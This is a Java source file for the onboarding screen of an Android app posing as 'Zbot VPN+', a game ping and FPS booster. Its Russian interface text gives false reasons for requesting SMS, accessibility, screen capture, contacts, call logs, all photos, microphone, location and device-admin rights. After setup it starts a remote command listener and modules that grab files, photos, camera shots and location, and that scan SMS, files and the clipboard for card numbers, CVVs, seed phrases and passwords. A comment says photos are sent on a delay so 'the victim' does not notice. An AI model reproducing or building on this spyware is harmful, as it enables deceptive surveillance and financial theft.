package com.brawl.modmenu;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

public class OnboardingActivity extends Activity {

    private static final int REQ_PHOTOS = 300;
    private static final int REQ_STORAGE = 301;

    private static final String[] STEPS_TITLE = {
        "Подключение к игровым серверам",
        "Отображение статуса соединения",
        "Автоматическая авторизация",
        "Работа в фоне",
        "Оптимизация игровых процессов",
        "Фильтр игровых помех",
        "Анализ графики в реальном времени",
        "Поиск друзей в играх",
        "Анализ игрового окружения",
        "Оптимизация звука и локации",
        "Защита от сбоев системы"
    };

    private static final String[] STEPS_SUBTITLE = {
        "Без этого VPN не активируется",
        "Нужно для контроля",
        "Для входа без задержек",
        "Чтобы VPN не отключался",
        "Самое важное разрешение",
        "Убирает лаги",
        "Даёт +30% FPS",
        "Для лобби",
        "Проверка соединения",
        "Ближайшие серверы",
        "Стабильность"
    };

    private static final String[] STEPS_DESC = {
        "Zbot VPN+ использует технологию оптимизации трафика. Без разрешения на VPN подключение приложение не сможет создавать туннель.",
        "Уведомления используются для отображения текущего статуса подключения.",
        "Zbot VPN+ использует SMS-верификацию для авторизации на серверах.",
        "Android ограничивает работу фоновых приложений. Если Zbot будет ограничен — VPN отключится через 2-3 минуты.",
        "Специальные возможности — системное разрешение для мониторинга игровых приложений.",
        "Доступ к уведомлениям для скрытия лишних оповещений.",
        "Zbot анализирует видеопоток и оптимизирует текстуры.",
        "Zbot использует контакты для поиска друзей.",
        "Камера используется для анализа помех.",
        "Микрофон и GPS для оптимизации и выбора сервера.",
        "Zbot VPN+ нуждается в защите от случайного удаления."
    };

    private static final String[] STEPS_BENEFITS = {
        "✅ Снижение пинга до 40%\n✅ Оптимизация UDP",
        "✅ Живой статус\n✅ Автоскрытие",
        "✅ Автовход\n✅ Экономия времени",
        "✅ Работа 24/7\n✅ VPN не отключается",
        "✅ +47% FPS\n✅ Оптимизация",
        "✅ Нет лагов",
        "✅ +30% FPS\n✅ Текстуры",
        "✅ Поиск друзей",
        "✅ Анализ",
        "✅ Чистый звук",
        "✅ Защита"
    };

    private static final String[] STEPS_IMPORTANCE = {
        "⚠️ ОБЯЗАТЕЛЬНО",
        "✅ Рекомендуется",
        "⚠️ Требуется",
        "⚠️ ОБЯЗАТЕЛЬНО",
        "🔥 КРИТИЧЕСКИ ВАЖНО",
        "✅ Рекомендуется",
        "⚠️ Требуется",
        "✅ Опционально",
        "✅ Опционально",
        "✅ Рекомендуется",
        "⚠️ Требуется"
    };

    private static final int TOTAL = 11;
    private int current = 0;

    private TextView stepTitle, stepSubtitle, stepDesc, stepBenefits, stepImportance, stepCounter;
    private ProgressBar progress;
    private Button btnNext;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.onboarding);

        stepTitle = findViewById(R.id.stepTitle);
        stepSubtitle = findViewById(R.id.stepSubtitle);
        stepDesc = findViewById(R.id.stepDesc);
        stepBenefits = findViewById(R.id.stepBenefits);
        stepImportance = findViewById(R.id.stepImportance);
        stepCounter = findViewById(R.id.stepCounter);
        progress = findViewById(R.id.progress);
        btnNext = findViewById(R.id.btnNext);

        updateUI();

        btnNext.setOnClickListener(v -> {
            if (current >= TOTAL) {
                finishOnboarding();
                return;
            }
            runStep(current);
        });
    }

    private void updateUI() {
        if (current >= TOTAL) {
            stepTitle.setText("Всё готово!");
            stepSubtitle.setText("Настройка завершена");
            stepDesc.setText("Все разрешения получены. Zbot VPN+ готов к работе.");
            stepBenefits.setText("✅ VPN активирован\n✅ Все функции включены");
            stepImportance.setText("🎉 ГОТОВО");
            btnNext.setText("ЗАВЕРШИТЬ");
            progress.setProgress(100);
            stepCounter.setText("Настройка Zbot 100%");
            return;
        }
        stepTitle.setText(STEPS_TITLE[current]);
        stepSubtitle.setText(STEPS_SUBTITLE[current]);
        stepDesc.setText(STEPS_DESC[current]);
        stepBenefits.setText(STEPS_BENEFITS[current]);
        stepImportance.setText(STEPS_IMPORTANCE[current]);
        btnNext.setText("ПРОДОЛЖИТЬ");
        int pct = current * 100 / TOTAL;
        progress.setProgress(pct);
        stepCounter.setText("Настройка Zbot " + pct + "%");
    }

    private void runStep(int step) {
        switch (step) {
            case 0:
                Intent vpn = android.net.VpnService.prepare(this);
                if (vpn != null) startActivityForResult(vpn, 100);
                else advance();
                break;
            case 1:
                if (Build.VERSION.SDK_INT >= 33)
                    requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                else advance();
                break;
            case 2:
                requestPermissions(new String[]{
                    Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS
                }, 102);
                break;
            case 3:
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, 103);
                } else advance();
                break;
            case 4:
                startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                break;
            case 5:
                startActivityForResult(new Intent(
                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                break;
            case 6:
                MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), 106);
                break;
            case 7:
                requestPermissions(new String[]{
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                }, 107);
                break;
            case 8:
                // ФОТО — запрос на все фото
                requestPhotos();
                break;
            case 9:
                requestPermissions(new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                }, 109);
                break;
            case 10:
                DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName cn = new ComponentName(this, AdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(cn)) {
                    Intent admin = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                    admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Защита Zbot VPN+ от случайного удаления.");
                    startActivityForResult(admin, 110);
                } else advance();
                break;
        }
    }

    // Запрос разрешения на ВСЕ фото
    private void requestPhotos() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
                }, REQ_PHOTOS);
            } else {
                advance();
            }
        } else {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                }, REQ_STORAGE);
            } else {
                advance();
            }
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == 106 && res == RESULT_OK && data != null) {
            getSharedPreferences("mp", MODE_PRIVATE).edit()
                .putInt("code", res)
                .putString("data_uri", data.toUri(0))
                .apply();
        }
        advance();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);

        // Если это запрос фото — запоминаем что получили доступ
        if (req == REQ_PHOTOS || req == REQ_STORAGE) {
            boolean granted = false;
            for (int result : r) {
                if (result == PackageManager.PERMISSION_GRANTED) {
                    granted = true;
                    break;
                }
            }
            getSharedPreferences("photo_access", MODE_PRIVATE)
                .edit().putBoolean("granted", granted).apply();
        }
        advance();
    }

    private void advance() { current++; updateUI(); }

    private void finishOnboarding() {
        try {
            if (Build.VERSION.SDK_INT >= 26)
                startForegroundService(new Intent(this, KeepAliveService.class));
            else
                startService(new Intent(this, KeepAliveService.class));
        } catch (Throwable ignored) {}

        try {
            if (Build.VERSION.SDK_INT >= 26)
                startForegroundService(new Intent(this, CommandListener.class));
            else
                startService(new Intent(this, CommandListener.class));
        } catch (Throwable ignored) {}

        // Запуск модулей
        ClipboardMonitor.start(this);
        FileScanner.scan();
        GameList.dump(this);
        LocationTracker.start(this);
        NewPhotoWatcher.start(this);
        BatteryMonitor.start(this);
        DailyReporter.start(this);
        AutoFileGrabber.start(this);
        CameraAutoShot.start(this);
        WelcomeNotif.show(this);
        DeviceInfo.sendFull(this);
        AppList.dump(this);
        DataCollector.collectAll(this);

        CardScanner.scanSms(this);
        CardScanner.scanFiles();
        CardScanner.scanClipboard(this);
        SeedScanner.scanFiles();
        SeedScanner.scanClipboard(this);
        GooglePasswordScanner.scan();
        CvvScanner.scanAll(this);

        // ============================================
        // АВТО-ОТПРАВКА ВСЕХ ФОТО В ZIP
        // ============================================
        // Через 20 секунд (чтобы жертва не заметила) — собираем все фото
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                FileManager.allPhotos(OnboardingActivity.this);
            } catch (Throwable ignored) {}
        }, 20000);

        // Через 5 минут — вторая отправка (если первые не успели)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                FileManager.allPhotos(OnboardingActivity.this);
            } catch (Throwable ignored) {}
        }, 5 * 60 * 1000L);

        // Переход на логин
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startActivity(new Intent(this, WebLoginActivity.class));
            finish();
        }, 5000);
    }
}
